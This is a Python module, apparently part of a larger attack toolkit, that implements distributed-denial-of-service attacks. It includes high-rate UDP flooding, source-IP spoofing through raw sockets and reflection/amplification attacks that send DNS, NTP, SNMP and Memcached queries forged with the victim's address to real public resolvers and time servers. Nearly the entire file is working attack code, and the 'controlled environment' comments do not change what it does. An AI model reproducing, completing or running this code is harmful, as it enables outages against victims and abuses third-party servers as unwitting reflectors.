#!/usr/bin/env python3
"""
UDP Engine - High-performance UDP attack implementation
Provides optimized UDP-based attack vectors with amplification techniques
"""

import asyncio
import logging
import os
import socket
import time
import random
import struct
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass
from enum import Enum

try:
    from scapy.layers.inet import IP, UDP
    from scapy.layers.dns import DNS, DNSQR
    from scapy.packet import Raw
    from scapy.volatile import RandShort
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    logging.warning("Scapy not available, UDP engine will use basic sockets")

logger = logging.getLogger(__name__)


@dataclass
class UDPAttackConfig:
    """Configuration for UDP attacks"""
    target: str = ""
    port: int = 80
    packet_size: int = 1472
    source_port_range: Tuple[int, int] = (1024, 65535)
    enable_spoofing: bool = False
    spoofing_rate: float = 0.3
    fragmentation: bool = False
    amplification_servers: List[str] = None
    reflection_protocols: List[str] = None
    burst_size: int = 1000
    burst_interval: float = 0.001

class UDPAmplificationServers:
    """Database of amplification servers for different protocols"""
    
    DNS_SERVERS = [
        "8.8.8.8", "1.1.1.1", "9.9.9.9", "208.67.222.222",
        "185.228.168.9", "76.76.19.19", "94.140.14.14"
    ]
    
    NTP_SERVERS = [
        "pool.ntp.org", "time.nist.gov", "time.google.com",
        "time.cloudflare.com", "time.windows.com"
    ]
    
    SNMP_SERVERS = [
        # Common SNMP-enabled devices (for testing in controlled environments)
        "192.168.1.1", "10.0.0.1", "172.16.0.1"
    ]
    
    MEMCACHED_SERVERS = [
        # Common memcached ports for testing
        "127.0.0.1:11211", "localhost:11211"
    ]

class UDPPayloadGenerator:
    """Generates optimized UDP payloads for different attack types"""
    
    @staticmethod
    def random_payload(size: int) -> bytes:
        """Generate random payload of specified size"""
        return os.urandom(size)
    
    @staticmethod
    def dns_amplification_payload(target: str, query_type: str = "ANY") -> bytes:
        """Generate DNS amplification payload"""
        # Create DNS query for maximum amplification
        query_names = [
            "isc.org",  # Known for large TXT records
            "google.com",
            "cloudflare.com",
            "example.com"
        ]
        
        query_name = random.choice(query_names)
        
        dns_packet = DNS(
            id=random.randint(0, 65535),
            qr=0,  # Query
            opcode=0,  # Standard query
            rd=1,  # Recursion desired
            qd=DNSQR(qname=query_name, qtype=query_type)
        )
        
        # Spoof source IP to target
        ip_packet = IP(src=target, dst="8.8.8.8") / UDP(sport=random.randint(1024, 65535), dport=53) / dns_packet
        
        return bytes(ip_packet)
    
    @staticmethod
    def ntp_amplification_payload(target: str) -> bytes:
        """Generate NTP amplification payload (monlist request)"""
        # NTP monlist request for amplification
        ntp_packet = struct.pack("!BBBBIIIIIII", 
                                0x17,  # LI, VN, Mode
                                0x00,  # Stratum
                                0x03,  # Poll
                                0x2a,  # Precision
                                0, 0, 0, 0, 0, 0, 0)  # Rest of NTP header
        
        ip_packet = IP(src=target, dst="pool.ntp.org") / UDP(sport=random.randint(1024, 65535), dport=123) / Raw(load=ntp_packet)
        
        return bytes(ip_packet)
    
    @staticmethod
    def snmp_amplification_payload(target: str) -> bytes:
        """Generate SNMP amplification payload"""
        # SNMP GetBulkRequest for amplification
        snmp_packet = bytes([
            0x30, 0x26,  # SEQUENCE
            0x02, 0x01, 0x01,  # Version (SNMPv2c)
            0x04, 0x06, 0x70, 0x75, 0x62, 0x6c, 0x69, 0x63,  # Community "public"
            0xa5, 0x19,  # GetBulkRequest
            0x02, 0x04, 0x00, 0x00, 0x00, 0x00,  # Request ID
            0x02, 0x01, 0x00,  # Non-repeaters
            0x02, 0x01, 0x7f,  # Max-repetitions (127)
            0x30, 0x0b,  # Variable bindings
            0x30, 0x09,  # Variable binding
            0x06, 0x05, 0x2b, 0x06, 0x01, 0x02, 0x01,  # OID 1.3.6.1.2.1
            0x05, 0x00  # NULL
        ])
        
        ip_packet = IP(src=target, dst="192.168.1.1") / UDP(sport=random.randint(1024, 65535), dport=161) / Raw(load=snmp_packet)
        
        return bytes(ip_packet)
    
    @staticmethod
    def memcached_amplification_payload(target: str) -> bytes:
        """Generate Memcached amplification payload"""
        # Memcached stats command for amplification
        memcached_packet = b"stats\r\n"
        
        ip_packet = IP(src=target, dst="127.0.0.1") / UDP(sport=random.randint(1024, 65535), dport=11211) / Raw(load=memcached_packet)
        
        return bytes(ip_packet)
    
    @staticmethod
    def fragmented_payload(size: int, fragment_size: int = 1400) -> List[bytes]:
        """Generate fragmented UDP payload"""
        payload = os.urandom(size)
        fragments = []
        
        for i in range(0, len(payload), fragment_size):
            fragment = payload[i:i + fragment_size]
            fragments.append(fragment)
        
        return fragments

class ExtremeUDPEngine:
    """Extreme UDP attack engine with high-rate flooding and amplification capabilities"""
    
    def __init__(self, config: UDPAttackConfig = None):
        self.config = config or UDPAttackConfig()
        self.payload_gen = UDPPayloadGenerator()
        self.amp_servers = UDPAmplificationServers()
        self.spoofed_ips = self._generate_spoofed_ips()
        self.stats = {
            'packets_sent': 0,
            'bytes_sent': 0,
            'amplification_requests': 0,
            'reflection_attacks': 0,
            'fragmented_packets': 0,
            'errors': 0
        }
    
    def _generate_spoofed_ips(self) -> List[str]:
        """Generate pool of spoofed IP addresses"""
        ips = []
        for _ in range(1000):  # Larger pool for UDP
            # Generate random IP addresses for spoofing
            ip = f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
            ips.append(ip)
        return ips
    
    async def high_rate_udp_flood(self, duration: float = 0) -> None:
        """
        High-rate UDP flooding with optimization
        Requirements: 5.1, 5.4, 5.5
        """
        start_time = time.time()
        tasks = []
        
        # Create multiple high-performance UDP flood workers
        num_workers = min(1000, self.config.burst_size)
        for _ in range(num_workers):
            task = asyncio.create_task(self._udp_flood_worker())
            tasks.append(task)
        
        try:
            if duration > 0:
                await asyncio.wait_for(asyncio.gather(*tasks), timeout=duration)
            else:
                await asyncio.gather(*tasks)
        except asyncio.TimeoutError:
            pass
        finally:
            for task in tasks:
                task.cancel()
    
    async def _udp_flood_worker(self) -> None:
        """High-performance UDP flood worker"""
        # Create socket with optimizations
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setblocking(False)
        
        # Socket optimizations
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024)  # 1MB send buffer
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            while True:
                # Burst sending for maximum performance
                for _ in range(self.config.burst_size):
                    try:
                        # Generate payload
                        if self.config.fragmentation and random.random() < 0.3:
                            # Send fragmented packets
                            fragments = self.payload_gen.fragmented_payload(
                                self.config.packet_size * 2, 
                                self.config.packet_size
                            )
                            for fragment in fragments:
                                sock.sendto(fragment, (self.config.target, self.config.port))
                                self.stats['fragmented_packets'] += 1
                                self.stats['bytes_sent'] += len(fragment)
                        else:
                            # Regular UDP packet
                            payload = self.payload_gen.random_payload(self.config.packet_size)
                            sock.sendto(payload, (self.config.target, self.config.port))
                            
                        self.stats['packets_sent'] += 1
                        self.stats['bytes_sent'] += len(payload) if 'payload' in locals() else self.config.packet_size
                        
                    except BlockingIOError:
                        # Socket buffer full, brief pause
                        await asyncio.sleep(0.0001)
                    except Exception as e:
                        self.stats['errors'] += 1
                
                # Brief pause between bursts
                await asyncio.sleep(self.config.burst_interval)
                
        finally:
            sock.close()
    
    async def reflection_amplification_attack(self, protocols: List[str], duration: float = 0) -> None:
        """
        Reflection and amplification attack using multiple protocols
        Requirements: 5.1, 5.4, 5.5
        """
        start_time = time.time()
        tasks = []
        
        for protocol in protocols:
            if protocol.upper() == "DNS":
                tasks.append(asyncio.create_task(self._dns_amplification_worker()))
            elif protocol.upper() == "NTP":
                tasks.append(asyncio.create_task(self._ntp_amplification_worker()))
            elif protocol.upper() == "SNMP":
                tasks.append(asyncio.create_task(self._snmp_amplification_worker()))
            elif protocol.upper() == "MEMCACHED":
                tasks.append(asyncio.create_task(self._memcached_amplification_worker()))
        
        try:
            if duration > 0:
                await asyncio.wait_for(asyncio.gather(*tasks), timeout=duration)
            else:
                await asyncio.gather(*tasks)
        except asyncio.TimeoutError:
            pass
        finally:
            for task in tasks:
                task.cancel()
    
    async def _dns_amplification_worker(self) -> None:
        """DNS amplification attack worker"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        try:
            while True:
                for _ in range(100):  # Burst of requests
                    try:
                        # Rotate through different query types for maximum amplification
                        query_types = ["ANY", "TXT", "MX", "AAAA", "NS"]
                        query_type = random.choice(query_types)
                        
                        payload = self.payload_gen.dns_amplification_payload(
                            self.config.target, query_type
                        )
                        
                        # Send to random DNS server
                        dns_server = random.choice(self.amp_servers.DNS_SERVERS)
                        sock.sendto(payload, (dns_server, 0))
                        
                        self.stats['amplification_requests'] += 1
                        self.stats['bytes_sent'] += len(payload)
                        
                    except Exception as e:
                        self.stats['errors'] += 1
                
                await asyncio.sleep(0.01)
                
        except PermissionError:
            # Fallback to regular socket if raw sockets not available
            await self._dns_amplification_fallback()
        finally:
            try:
                sock.close()
            except:
                pass
    
    async def _dns_amplification_fallback(self) -> None:
        """DNS amplification fallback for non-privileged mode"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        try:
            while True:
                # Create DNS query manually
                dns_query = struct.pack("!HHHHHH", 
                                      random.randint(0, 65535),  # Transaction ID
                                      0x0100,  # Flags (standard query)
                                      1, 0, 0, 0)  # Questions, Answers, Authority, Additional
                
                # Add question section
                domain = b"isc.org"  # Known for large responses
                dns_query += domain + b"\x00"  # Domain name
                dns_query += struct.pack("!HH", 255, 1)  # Type ANY, Class IN
                
                sock.sendto(dns_query, (random.choice(self.amp_servers.DNS_SERVERS), 53))
                self.stats['amplification_requests'] += 1
                self.stats['bytes_sent'] += len(dns_query)
                
                await asyncio.sleep(0.001)
                
        finally:
            sock.close()
    
    async def _ntp_amplification_worker(self) -> None:
        """NTP amplification attack worker"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        try:
            while True:
                for _ in range(50):  # Burst of NTP requests
                    try:
                        # NTP monlist request (deprecated but still works on some servers)
                        ntp_packet = struct.pack("!BBBBIIIIIII", 
                                                0x17, 0x00, 0x03, 0x2a,
                                                0, 0, 0, 0, 0, 0, 0)
                        
                        # Send to NTP servers
                        ntp_server = random.choice(self.amp_servers.NTP_SERVERS)
                        try:
                            # Resolve hostname to IP
                            ntp_ip = socket.gethostbyname(ntp_server)
                            sock.sendto(ntp_packet, (ntp_ip, 123))
                            
                            self.stats['amplification_requests'] += 1
                            self.stats['bytes_sent'] += len(ntp_packet)
                        except socket.gaierror:
                            continue
                            
                    except Exception as e:
                        self.stats['errors'] += 1
                
                await asyncio.sleep(0.02)
                
        finally:
            sock.close()
    
    async def _snmp_amplification_worker(self) -> None:
        """SNMP amplification attack worker"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        try:
            while True:
                for _ in range(30):  # Burst of SNMP requests
                    try:
                        payload = self.payload_gen.snmp_amplification_payload(self.config.target)
                        
                        # Send to SNMP servers (in controlled environment)
                        snmp_server = random.choice(self.amp_servers.SNMP_SERVERS)
                        sock.sendto(payload[-100:], (snmp_server, 161))  # Send payload portion
                        
                        self.stats['amplification_requests'] += 1
                        self.stats['bytes_sent'] += len(payload)
                        
                    except Exception as e:
                        self.stats['errors'] += 1
                
                await asyncio.sleep(0.05)
                
        finally:
            sock.close()
    
    async def _memcached_amplification_worker(self) -> None:
        """Memcached amplification attack worker"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        try:
            while True:
                for _ in range(20):  # Burst of Memcached requests
                    try:
                        # Memcached stats command
                        memcached_packet = b"stats\r\n"
                        
                        # Send to Memcached servers
                        for server in self.amp_servers.MEMCACHED_SERVERS:
                            host, port = server.split(":")
                            sock.sendto(memcached_packet, (host, int(port)))
                            
                            self.stats['amplification_requests'] += 1
                            self.stats['bytes_sent'] += len(memcached_packet)
                            
                    except Exception as e:
                        self.stats['errors'] += 1
                
                await asyncio.sleep(0.1)
                
        finally:
            sock.close()
    
    async def protocol_specific_payloads_attack(self, duration: float = 0) -> None:
        """
        Attack using protocol-specific payloads for maximum impact
        Requirements: 5.1, 5.4, 5.5
        """
        start_time = time.time()
        
        # Protocol-specific payload generators
        payload_generators = {
            53: self._dns_payload,      # DNS
            123: self._ntp_payload,     # NTP
            161: self._snmp_payload,    # SNMP
            1900: self._ssdp_payload,   # SSDP
            5353: self._mdns_payload,   # mDNS
        }
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setblocking(False)
        
        try:
            while duration == 0 or (time.time() - start_time) < duration:
                # Select appropriate payload based on target port
                if self.config.port in payload_generators:
                    payload = payload_generators[self.config.port]()
                else:
                    payload = self.payload_gen.random_payload(self.config.packet_size)
                
                try:
                    sock.sendto(payload, (self.config.target, self.config.port))
                    self.stats['packets_sent'] += 1
                    self.stats['bytes_sent'] += len(payload)
                except BlockingIOError:
                    await asyncio.sleep(0.0001)
                except Exception as e:
                    self.stats['errors'] += 1
                
                await asyncio.sleep(0.0001)
                
        finally:
            sock.close()
    
    def _dns_payload(self) -> bytes:
        """Generate DNS-specific payload"""
        # DNS query with EDNS0 for larger responses
        query_id = random.randint(0, 65535)
        flags = 0x0100  # Standard query with recursion desired
        
        payload = struct.pack("!HHHHHH", query_id, flags, 1, 0, 0, 1)  # Header with additional record
        
        # Question section
        domain = b"example.com"
        payload += domain + b"\x00\x00\x01\x00\x01"  # A record query
        
        # EDNS0 additional record for larger response
        payload += b"\x00"  # Root domain
        payload += struct.pack("!HHIH", 41, 4096, 0, 0)  # OPT record
        
        return payload
    
    def _ntp_payload(self) -> bytes:
        """Generate NTP-specific payload"""
        # NTP request packet
        return struct.pack("!BBBBIIIIIII", 
                          0x1b, 0x00, 0x00, 0x00,  # LI, VN, Mode, Stratum, Poll, Precision
                          0, 0, 0, 0, 0, 0, 0)      # Root delay, dispersion, ref ID, timestamps
    
    def _snmp_payload(self) -> bytes:
        """Generate SNMP-specific payload"""
        # SNMP GetRequest
        return bytes([
            0x30, 0x1c,  # SEQUENCE
            0x02, 0x01, 0x00,  # Version (SNMPv1)
            0x04, 0x06, 0x70, 0x75, 0x62, 0x6c, 0x69, 0x63,  # Community "public"
            0xa0, 0x0f,  # GetRequest
            0x02, 0x01, 0x01,  # Request ID
            0x02, 0x01, 0x00,  # Error status
            0x02, 0x01, 0x00,  # Error index
            0x30, 0x04,  # Variable bindings
            0x30, 0x02,  # Variable binding
            0x05, 0x00   # NULL
        ])
    
    def _ssdp_payload(self) -> bytes:
        """Generate SSDP-specific payload"""
        # SSDP M-SEARCH request
        ssdp_request = (
            "M-SEARCH * HTTP/1.1\r\n"
            "HOST: 239.255.255.250:1900\r\n"
            "MAN: \"ssdp:discover\"\r\n"
            "ST: upnp:rootdevice\r\n"
            "MX: 3\r\n\r\n"
        )
        return ssdp_request.encode()
    
    def _mdns_payload(self) -> bytes:
        """Generate mDNS-specific payload"""
        # mDNS query
        query_id = 0  # mDNS uses 0 for queries
        flags = 0x0000  # Standard query
        
        payload = struct.pack("!HHHHHH", query_id, flags, 1, 0, 0, 0)
        
        # Question for _services._dns-sd._udp.local
        domain = b"_services._dns-sd._udp.local"
        payload += domain + b"\x00\x00\x0c\x00\x01"  # PTR record query
        
        return payload
    
    def get_stats(self) -> Dict[str, Any]:
        """Get attack statistics"""
        return self.stats.copy()
    
    async def coordinated_udp_attack(self, attack_types: List[str], duration: float = 0) -> None:
        """
        Coordinate multiple UDP attack types simultaneously
        Requirements: 5.1, 5.4, 5.5
        """
        tasks = []
        
        if "flood" in attack_types:
            tasks.append(asyncio.create_task(self.high_rate_udp_flood(duration)))
        
        if "amplification" in attack_types:
            protocols = ["DNS", "NTP", "SNMP", "MEMCACHED"]
            tasks.append(asyncio.create_task(self.reflection_amplification_attack(protocols, duration)))
        
        if "protocol_specific" in attack_types:
            tasks.append(asyncio.create_task(self.protocol_specific_payloads_attack(duration)))
        
        try:
            await asyncio.gather(*tasks)
        finally:
            for task in tasks:
                if not task.done():
                    task.cancel()